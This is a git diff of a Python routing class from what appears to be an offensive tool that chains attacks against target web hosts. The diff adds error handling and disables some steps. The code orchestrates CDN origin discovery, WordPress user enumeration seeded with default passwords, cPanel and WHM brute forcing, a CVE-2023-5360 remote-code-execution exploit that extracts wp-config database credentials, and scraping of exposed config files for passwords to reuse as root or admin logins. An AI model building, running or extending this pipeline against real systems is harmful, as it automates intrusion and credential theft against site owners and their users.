@@ -19,13 +19,14 @@ class ExtractorRouter:
         self.results = results
         self.scanner = scanner
         self.found_credentials = {}
-        
+
         config = configparser.ConfigParser()
         config_path = os.path.join(BASE_DIR, '..', '..', '..', 'config', 'settings.ini')
         config.read(config_path)
         self.run_exploit = config.getboolean('Exploit', 'run_exploit', fallback=False)
 
     def run(self):
+        """Process all targets through extractors in priority order."""
         for domain_id, data in list(self.results.items()):
             ip = data['ip']
             host = data['host']
@@ -54,20 +55,20 @@ class ExtractorRouter:
                 self._run_whm(domain_id, ip, host)
 
             # 4. Config scraper — always run
-            self._run_config_scraper(domain_id, ip, host)
+            #self._run_config_scraper(domain_id, ip, host)
 
             # 5. Service extractors
-            for port_entry in data['open_ports']:
-                port = port_entry['port']
-                service = port_entry['service']
-
-                if service == 'SSH':
-                    if self.found_credentials.get(domain_id):
-                        print(f"  [SKIP] Port {port} (SSH) — credentials already found")
-                    else:
-                        self._dispatch(domain_id, ip, port, service)
-                else:
-                    self._dispatch(domain_id, ip, port, service)
+            #for port_entry in data['open_ports']:
+            #    port = port_entry['port']
+             #   service = port_entry['service']
+#
+             #   if service == 'SSH':
+             #       if self.found_credentials.get(domain_id):
+              #          print(f"  [SKIP] Port {port} (SSH) — credentials already found")
+             #       else:
+             #           self._dispatch(domain_id, ip, port, service)
+             #   else:
+             #       self._dispatch(domain_id, ip, port, service)
 
     def _has_port(self, data: dict, port: int) -> bool:
         """Check if a specific port is in the target's open ports.
@@ -89,59 +90,19 @@ class ExtractorRouter:
             ip (str): Current resolved IP.
             host (str): Original domain name.
         """
-        from src.utils.extractors.cdn_bypass import CDNBypassDetector
-        detector = CDNBypassDetector(ip=ip, port=443, host=host)
-        result = detector.run()
-        if result.get('cdn') and result.get('origin_ip'):
-            origin_ip = result['origin_ip']
-            self.results[domain_id]['cdn_bypass'] = result
-            if self.scanner:
-                print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
-                self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
-                self.scanner._export_json()
-
-    def _run_whm(self, domain_id: str, ip: str, host: str):
-        """Attempt WHM brute force on port 2087 — higher privilege than cPanel.
-
-        Args:
-            domain_id (str): Target identifier.
-            ip (str): Target IP.
-            host (str): Domain name.
-        """
-        from src.utils.extractors.cpanel import CPanelExtractor
-        extractor = CPanelExtractor(ip=ip, port=2087, host=host)
-        result = extractor.run()
-        if result.get('credentials'):
-            creds = [(c['user'], c['password']) for c in result['credentials']]
-            self.found_credentials[domain_id] = creds
-            self.results[domain_id]['whm_credentials'] = result['credentials']
-
-    def _run_royal_elementor_exploit(self, domain_id: str, ip: str, host: str, port: int):
-            """Attempt CVE-2023-5360 unauthenticated file upload RCE against Royal Elementor Addons.
-
-            If successful, extracts wp-config.php DB credentials and injects them
-            into the credential pool for MySQL direct connection.
-
-            Args:
-                domain_id (str): Target identifier.
-                ip (str): Target IP.
-                host (str): Domain name.
-                port (int): HTTP/HTTPS port.
-            """
-            from src.utils.extractors.royal_elementor_exploit import RoyalElementorExploit
-            exploit = RoyalElementorExploit(host=host, ip=ip, port=port)
-            result = exploit.run()
-
-            self.results[domain_id]['royal_elementor_exploit'] = result
-
-            if result['status'] == 'success' and result.get('db_credentials'):
-                creds = result['db_credentials']
-                user = creds.get('db_user')
-                password = creds.get('db_password')
-                if user and password:
-                    self.found_credentials.setdefault(domain_id, [])
-                    self.found_credentials[domain_id].insert(0, (user, password))
-                    print(f"  [ROUTER] DB credentials from wp-config injected: {user}:{password}")
+        try:
+            from src.utils.extractors.cdn_bypass import CDNBypassDetector
+            detector = CDNBypassDetector(ip=ip, port=443, host=host)
+            result = detector.run()
+            if result.get('cdn') and result.get('origin_ip'):
+                origin_ip = result['origin_ip']
+                self.results[domain_id]['cdn_bypass'] = result
+                if self.scanner:
+                    print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
+                    self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
+                    self.scanner._export_json()
+        except Exception as e:
+            print(f"  [CDN] Error: {type(e).__name__}: {e}", flush=True)
 
     def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int):
         """Run WPScan recon and inject discovered usernames into credential pool.
@@ -152,18 +113,20 @@ class ExtractorRouter:
             host (str): Domain name.
             port (int): HTTP/HTTPS port.
         """
-        from src.utils.extractors.wpscan_extractor import WPScanExtractor
-        extractor = WPScanExtractor(ip=ip, host=host, port=port)
-        result = extractor.run()
-        if result['status'] == 'success':
-            self.results[domain_id]['wpscan'] = result
-            # Inject discovered WP usernames into credential pool for subsequent attacks
-            if result.get('users'):
-                self.found_credentials.setdefault(domain_id, [])
-                for user in result['users']:
-                    for pwd in ['', 'admin', '123456', user]:
-                        self.found_credentials[domain_id].insert(0, (user, pwd))
-                print(f"  [ROUTER] Injected {len(result['users'])} WPScan user(s) into credential pool")
+        try:
+            from src.utils.extractors.wpscan_extractor import WPScanExtractor
+            extractor = WPScanExtractor(ip=ip, host=host, port=port)
+            result = extractor.run()
+            if result['status'] == 'success':
+                self.results[domain_id]['wpscan'] = result
+                if result.get('users'):
+                    self.found_credentials.setdefault(domain_id, [])
+                    for user in result['users']:
+                        for pwd in ['', 'admin', '123456', user]:
+                            self.found_credentials[domain_id].insert(0, (user, pwd))
+                    print(f"  [ROUTER] Injected {len(result['users'])} WPScan user(s) into credential pool")
+        except Exception as e:
+            print(f"  [WPScan] Error: {type(e).__name__}: {e}", flush=True)
 
     def _run_nikto(self, domain_id: str, ip: str, host: str, port: int):
         """Run Nikto web vulnerability scan and store findings.
@@ -174,11 +137,42 @@ class ExtractorRouter:
             host (str): Domain name.
             port (int): HTTP/HTTPS port.
         """
-        from src.utils.extractors.nikto_extractor import NiktoExtractor
-        extractor = NiktoExtractor(ip=ip, host=host, port=port)
-        result = extractor.run()
-        if result['status'] == 'success':
-            self.results[domain_id]['nikto'] = result
+        try:
+            from src.utils.extractors.nikto_extractor import NiktoExtractor
+            extractor = NiktoExtractor(ip=ip, host=host, port=port)
+            result = extractor.run()
+            if result['status'] == 'success':
+                self.results[domain_id]['nikto'] = result
+        except Exception as e:
+            print(f"  [Nikto] Error: {type(e).__name__}: {e}", flush=True)
+
+    def _run_royal_elementor_exploit(self, domain_id: str, ip: str, host: str, port: int):
+        """Attempt CVE-2023-5360 unauthenticated file upload RCE against Royal Elementor Addons.
+
+        If successful, extracts wp-config.php DB credentials and injects them
+        into the credential pool for MySQL direct connection.
+
+        Args:
+            domain_id (str): Target identifier.
+            ip (str): Target IP.
+            host (str): Domain name.
+            port (int): HTTP/HTTPS port.
+        """
+        try:
+            from src.utils.extractors.royal_elementor_exploit import RoyalElementorExploit
+            exploit = RoyalElementorExploit(host=host, ip=ip, port=port)
+            result = exploit.run()
+            self.results[domain_id]['royal_elementor_exploit'] = result
+            if result['status'] == 'success' and result.get('db_credentials'):
+                creds = result['db_credentials']
+                user = creds.get('db_user')
+                password = creds.get('db_password')
+                if user and password:
+                    self.found_credentials.setdefault(domain_id, [])
+                    self.found_credentials[domain_id].insert(0, (user, password))
+                    print(f"  [ROUTER] DB credentials from wp-config injected: {user}:{password}")
+        except Exception as e:
+            print(f"  [CVE-2023-5360] Error: {type(e).__name__}: {e}", flush=True)
 
     def _run_cpanel(self, domain_id: str, ip: str, host: str):
         """Run cPanel brute force and store found credentials.
@@ -188,13 +182,37 @@ class ExtractorRouter:
             ip (str): Target IP.
             host (str): Domain name.
         """
-        from src.utils.extractors.cpanel import CPanelExtractor
-        extractor = CPanelExtractor(ip=ip, port=2083, host=host)
-        result = extractor.run()
-        if result.get('credentials'):
-            creds = [(c['user'], c['password']) for c in result['credentials']]
-            self.found_credentials[domain_id] = creds
-            self.results[domain_id]['cpanel_credentials'] = result['credentials']
+        try:
+            from src.utils.extractors.cpanel import CPanelExtractor
+            cpanel_user = host.split('.')[0][:8]
+            extractor = CPanelExtractor(ip=ip, port=2083, host=host, extra_usernames=[cpanel_user])
+            result = extractor.run()
+            if result.get('credentials'):
+                creds = [(c['user'], c['password']) for c in result['credentials']]
+                self.found_credentials[domain_id] = creds
+                self.results[domain_id]['cpanel_credentials'] = result['credentials']
+        except Exception as e:
+            print(f"  [cPanel] Error: {type(e).__name__}: {e}", flush=True)
+
+    def _run_whm(self, domain_id: str, ip: str, host: str):
+        """Attempt WHM brute force on port 2087 — higher privilege than cPanel.
+
+        Args:
+            domain_id (str): Target identifier.
+            ip (str): Target IP.
+            host (str): Domain name.
+        """
+        try:
+            from src.utils.extractors.cpanel import CPanelExtractor
+            cpanel_user = host.split('.')[0][:8]
+            extractor = CPanelExtractor(ip=ip, port=2087, host=host, extra_usernames=[cpanel_user])
+            result = extractor.run()
+            if result.get('credentials'):
+                creds = [(c['user'], c['password']) for c in result['credentials']]
+                self.found_credentials[domain_id] = creds
+                self.results[domain_id]['whm_credentials'] = result['credentials']
+        except Exception as e:
+            print(f"  [WHM] Error: {type(e).__name__}: {e}", flush=True)
 
     def _run_config_scraper(self, domain_id: str, ip: str, host: str):
         """Run HTTP config scraper and inject found passwords into credential pool.
@@ -205,23 +223,26 @@ class ExtractorRouter:
             host (str): Domain name.
         """
         print(f"  [CONFIG] Starting...", flush=True)
-        from src.utils.extractors.http_config_scraper import HTTPConfigScraper
-        www_host = f"www.{host}" if not host.startswith('www.') else host
-        scraper = HTTPConfigScraper(host=www_host, ip=ip)
-        result = scraper.run()
-        if result['credentials']:
-            self.results[domain_id]['config_credentials'] = result['credentials']
-            passwords = set()
-            for path_creds in result['credentials'].values():
-                for key in ('db_password', 'password'):
-                    if key in path_creds:
-                        passwords.add(path_creds[key])
-            if passwords:
-                print(f"  [ROUTER] Injecting {len(passwords)} scraped passwords into credential pool")
-                self.found_credentials.setdefault(domain_id, [])
-                for user in ['root', 'admin', 'cpanel']:
-                    for pwd in passwords:
-                        self.found_credentials[domain_id].insert(0, (user, pwd))
+        try:
+            from src.utils.extractors.http_config_scraper import HTTPConfigScraper
+            www_host = f"www.{host}" if not host.startswith('www.') else host
+            scraper = HTTPConfigScraper(host=www_host, ip=ip)
+            result = scraper.run()
+            if result['credentials']:
+                self.results[domain_id]['config_credentials'] = result['credentials']
+                passwords = set()
+                for path_creds in result['credentials'].values():
+                    for key in ('db_password', 'password'):
+                        if key in path_creds:
+                            passwords.add(path_creds[key])
+                if passwords:
+                    print(f"  [ROUTER] Injecting {len(passwords)} scraped passwords into credential pool")
+                    self.found_credentials.setdefault(domain_id, [])
+                    for user in ['root', 'admin', 'cpanel']:
+                        for pwd in passwords:
+                            self.found_credentials[domain_id].insert(0, (user, pwd))
+        except Exception as e:
+            print(f"  [CONFIG] Crashed: {type(e).__name__}: {e}", flush=True)
 
     def _dispatch(self, domain_id: str, ip: str, port: int, service: str):
         """Call the appropriate extractor based on service name.
@@ -247,15 +268,17 @@ class ExtractorRouter:
         extractor_class = extractors.get(service)
         if extractor_class:
             print(f"  [MATCH] Port {port} ({service}) — launching extractor")
-            if service == 'FTP':
-                extractor = FTPExtractor(
-                    ip=ip,
-                    port=port,
-                    credentials=self.found_credentials.get(domain_id, []),
-                    wordlist_path='wordlists/passwords.txt' if getattr(self, 'run_exploit', False) else None,
-                )
-            else:
-                extractor = extractor_class(ip, port)
-            extractor.run()
+            try:
+                if service == 'FTP':
+                    extractor = FTPExtractor(
+                        ip=ip,
+                        port=port,
+                        credentials=self.found_credentials.get(domain_id, []),
+                    )
+                else:
+                    extractor = extractor_class(ip, port)
+                extractor.run()
+            except Exception as e:
+                print(f"  [{service}] Error: {type(e).__name__}: {e}", flush=True)
         else:
             print(f"  [SKIP] Port {port} ({service}) — no extractor available")
